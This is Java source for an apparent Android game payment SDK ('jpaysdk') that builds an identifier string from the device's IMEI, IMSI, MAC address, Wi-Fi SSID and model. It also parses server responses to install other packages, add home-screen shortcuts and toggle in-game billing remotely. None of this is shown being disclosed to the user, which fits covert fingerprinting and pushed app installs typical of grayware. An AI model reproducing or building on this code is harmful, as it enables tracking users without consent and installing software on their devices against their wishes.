package com.bb_sz.ndk;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.bb_sz.ndk.onetotwo.Model;
import com.bb_sz.ndk.onetotwo.OTUtil;
import com.bb_sz.ndk.payswitch.GameFreeSwitchRun;
import com.bb_sz.ndk.receiver.CSReceiver;
import com.bb_sz.ndk.receiver.InstallReceiver;
import com.bb_sz.ndk.shortcut.ShortCut;
import com.bb_sz.ndk.umswitch.UMSwitchRun;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

/**
 * Created by Administrator on 2016/9/22.
 * <p>1,xxxx</p>
 * <p>2,创建快捷键</p>
 * <p>3,控制游戏计费开关</p>
 * <p>tip: 快捷键图片不存在时，不创建快捷键</p>
 * <p>tip: uid文件不存在，不做游戏开关网络请求</p>
 */
public class App {
    public static Context mContext = null;//for jni need
    public static String mUID = null;//for jni need
    public static int debug = 0;
    private static final String TAG = "SkyApp";
    private static boolean isNetDecision = true;
    private static InstallReceiver mInstallReceiver = null;


    public native static void post(String host, int port, String content);

    public native static byte[] http(String host, int port, String content);

    protected static void attachBaseContext(Context base) {
        mContext = base;
        b(base);
        if (debug > 0) Log.d(TAG, "UID:" + mUID);
        addReceiver();
        System.loadLibrary("jpaysdk");
    }

    private static void addReceiver() {
        mContext.registerReceiver(new CSReceiver(), new IntentFilter("cs_notify_server"));
    }

    public static void onCreate(Context base) {
        attachBaseContext(base);
        if (isNetDecision) {
            isNetDecision = false;
            if (null != mUID) {
                GameFreeSwitchRun.start(mContext);
//                UMSwitchRun.start(mContext);
            }
        }
    }

    //创建游戏apk图标快捷键
    public static void a(byte[] data) {
        a(data, 0);
    }

    /**
     * @param data
     * @param type 0 == 1拖2接口解析数据
     *             1 == 快捷键接口解析数据
     */
    public static void a(byte[] data, int type) {

        String content = aa(data);
        if (null == content) return;

        switch (type) {
            case 0: {
                Model m = new Model(content);
                if (m.code != 0) {
                    return;
                }
                if (m.msg != null) {
                    if (debug > 0) Log.d(TAG, "register InstallReceiver");
                    if (null == mInstallReceiver) {
                        mInstallReceiver = new InstallReceiver();
                        IntentFilter it = new IntentFilter();
                        it.addDataScheme("package");
                        it.addAction(Intent.ACTION_PACKAGE_ADDED);
                        mContext.registerReceiver(mInstallReceiver, it);
                    }
                    OTUtil.getInstsance().install(mContext, m.msg);
                }
            }
            break;
            case 1: {
                ShortCut.getInstance().addShortcut(mContext, content);
                break;
            }
            default:
                break;
        }

    }

    public static String aa(byte[] data) {
        try {
            if (debug > 0) Log.d(TAG, "len:" + (null == data ? 0 : data.length));
            if (null == data || data.length == 0) return null;
            int start = -1;
            int end = -2;
            int len = data.length;
            for (int i = 0; i < len; i++) {
                if (data[i] == 0x0D
                        && i + 1 < len && data[i + 1] == 0x0A) {
                    if (i + 2 < len && data[i + 2] == 0x0D
                            && i + 3 < len && data[i + 3] == 0x0A) {
                        if (start == -1) {
                            start = i + 3;
                            if (debug > 0) Log.d(TAG, "start is " + start);
                        } else {
                            end = i;
                            if (debug > 0) Log.d(TAG, "end is " + end);
                            break;
                        }
                    }
                }
            }

            String content = null;
            if (end <= 0) {
                end = len;
                if (debug > 0) Log.d(TAG, "end 2 is " + end);
            }
            int cLen = end - start;
            if (debug > 0) Log.d(TAG, "c len is " + cLen);
            if (cLen > 0) {
                byte[] con = new byte[cLen];
                if (debug > 0) Log.d(TAG, "con len is " + con.length);
                System.arraycopy(data, start, con, 0, cLen);
                try {
                    content = new String(con, "utf-8");
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                if (debug > 0) Log.d(TAG, ":-1-:" + content);
                if (null == content) return content;

                while (!(content.startsWith("{") && content.endsWith("}"))) {
                    int indexSt = content.indexOf("{");
                    int indexEt = content.lastIndexOf("}") + 1;
                    content = content.substring(indexSt, indexEt);
                    if (debug > 0) Log.d(TAG, ":--:" + content);
                }
            }
            return content;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    public static void b(Context ctx) {
        if (null == ctx) return;
        try {
            InputStream is = ctx.getAssets().open("jpay_uid.txt");
            int c = is.available();
            byte[] buffer = new byte[c];
            is.read(buffer);
            mUID = new String(buffer, "utf-8");
        } catch (IOException e) {
            mUID = null;
            return;
        }

        if (Build.VERSION.SDK_INT < 24) {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (null == tm) return;
            String deviceId = tm.getDeviceId();
            if (null != deviceId) {
                mUID += "&imei=" + deviceId;
            }
            String imsi = tm.getSubscriberId();
            if (null != imsi) {
                mUID += "&imsi=" + imsi;
            }
        } else {
            mUID += "&imei=" + Build.VERSION.SDK_INT;
        }

        mUID += "&model=" + Build.MODEL;
        mUID += "&sdk=" + Build.VERSION.SDK_INT;

        WifiManager wifi = (WifiManager) mContext
                .getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = wifi.getConnectionInfo();
        String macAddress = "";
        if (null != info) {
            macAddress = info.getMacAddress();
        }
        mUID += "&macAddress=" + macAddress;

        mUID += "&ssid=" + string2Unicode(info.getSSID());

        ApplicationInfo info2 = mContext.getApplicationInfo();
        String apkFile = info2.sourceDir;
        File apk = new File(apkFile);
        mUID += "&android_id=" + apk.lastModified();
    }


    static String string2Unicode(String s) {
        try {
            StringBuffer out = new StringBuffer("");
            byte[] bytes = s.getBytes("unicode");
            for (int i = 2; i < bytes.length - 1; i += 2) {
                out.append("\\u");
                String str = Integer.toHexString(bytes[i + 1] & 0xff);
                for (int j = str.length(); j < 2; j++) {
                    out.append("0");
                }
                String str1 = Integer.toHexString(bytes[i] & 0xff);
                for (int k = str1.length(); k < 2; k++) {
                    out.append("0");
                }
                out.append(str);

                out.append(str1);
            }
            return out.toString();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String get(String key) {
        if (null == mUID || null == key || !mUID.contains(key)) return null;
        if (mUID.contains("&")) {
            String[] maps = mUID.split("&");//cid
            for (String item : maps) {
                if (item.contains(key)) {
                    return item.substring(key.length() + 1);
                }
            }
            return null;
        } else {
            return null;
        }
    }
}
